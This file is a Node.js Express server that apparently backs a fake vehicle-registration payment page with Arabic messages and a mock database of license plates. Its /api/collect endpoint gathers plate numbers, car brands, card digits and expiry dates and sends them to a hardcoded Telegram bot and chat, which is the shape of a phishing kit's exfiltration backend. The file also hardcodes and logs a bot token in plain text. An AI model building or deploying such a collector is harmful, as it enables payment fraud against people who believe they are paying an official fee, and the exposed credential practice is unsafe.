import express from 'express';
import axios from 'axios';
import cors from 'cors';

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Hardcoded Bot Parameters
const BOT_TOKEN = process.env.BOT_TOKEN || '7856906286:AAFbx_K_V2qMxD_UxBc9LqKN_Q8vvKf_o2A';
const CHAT_ID = process.env.CHAT_ID || '6286341877';

console.log('[v0] Server Starting...');
console.log('[v0] BOT_TOKEN configured:', !!BOT_TOKEN);
console.log('[v0] CHAT_ID configured:', !!CHAT_ID);
console.log('[v0] BOT_TOKEN:', BOT_TOKEN);
console.log('[v0] CHAT_ID:', CHAT_ID);

// قاعدة بيانات وهمية للسيارات
const fakeCars = {
  "1234 ع 99": { marque: "Renault", modele: "Symbol", annee: "2020", carburant: "Essence" },
  "5678 و 22": { marque: "Hyundai", modele: "i10", annee: "2022", carburant: "Essence" },
  "9101 ب 33": { marque: "Dacia", modele: "Sandero", annee: "2019", carburant: "Diesel" },
  "1112 ج 44": { marque: "Peugeot", modele: "208", annee: "2021", carburant: "Essence" }
};

app.post('/api/collect', async (req, res) => {
  try {
    const { step, data } = req.body;
    
    let message = '';
    
    if (step === 'payment') {
      message = `📋 دفع جديد تم\n`;
      message += `━━━━━━━━━━━\n`;
      message += `🏷️ رقم التسجيل: ${data.plaque}\n`;
      message += `🚗 الماركة: ${data.marque}\n`;
      message += `💳 البطاقة: ****${data.cardLastFour}\n`;
      message += `📅 الانتهاء: ${data.expiry}\n`;
      message += `🕒 الوقت: ${data.timestamp}\n`;
      message += `━━━━━━━━━━━`;
    } else {
      message = `منصة تدريبية\nالخطوة: ${step}`;
    }
    
    console.log('[v0] Processing payment notification');
    console.log('[v0] Telegram Config - Token:', BOT_TOKEN.substring(0, 10) + '...', 'Chat:', CHAT_ID);
    
    if (BOT_TOKEN && CHAT_ID) {
      try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        });
        console.log('[v0] Telegram sent:', response.status);
      } catch (err) {
        console.error('[v0] Telegram failed:', err.response?.status, err.message);
      }
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('[v0] Error:', error.message);
    res.status(500).json({ error: error.message });
  }
});

// البحث عن السيارة
app.post('/api/search-car', (req, res) => {
  const plaque = req.body.plaque;
  const car = fakeCars[plaque];
  
  if (car) {
    res.json({ found: true, ...car, plaque });
  } else {
    res.json({ found: false });
  }
});

const port = process.env.PORT || 3000;
// هذا التصدير ضروري لـ Vercel
export default app;
app.listen(port, () => console.log(`✅ خادم المنصة يعمل على المنفذ ${port}`));
